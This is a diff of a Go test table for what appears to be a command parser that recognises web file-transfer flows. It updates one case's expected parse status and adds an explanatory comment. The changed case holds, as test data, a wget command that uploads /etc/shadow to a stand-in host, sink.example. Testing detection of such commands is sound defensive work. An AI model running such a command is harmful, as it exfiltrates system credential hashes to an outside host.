@@ -2176,10 +2176,13 @@ func TestWebTransferFileFormsAndFlows(t *testing.T) {
 		wantStatus ParseStatus
 	}{
 		{
-			name:       "wget joined post file",
-			argv:       []string{"wget", "--post-file=/etc/shadow", "https://sink.example/upload"},
-			path:       "/etc/shadow",
-			wantStatus: StatusPartial,
+			name: "wget joined post file",
+			argv: []string{"wget", "--post-file=/etc/shadow", "https://sink.example/upload"},
+			path: "/etc/shadow",
+			// A plain upload without -O saves its response under the last URL
+			// segment in the working directory, so the parse is complete
+			// (GAP-0595).
+			wantStatus: StatusComplete,
 		},
 		{
 			name: "curl separated upload file",
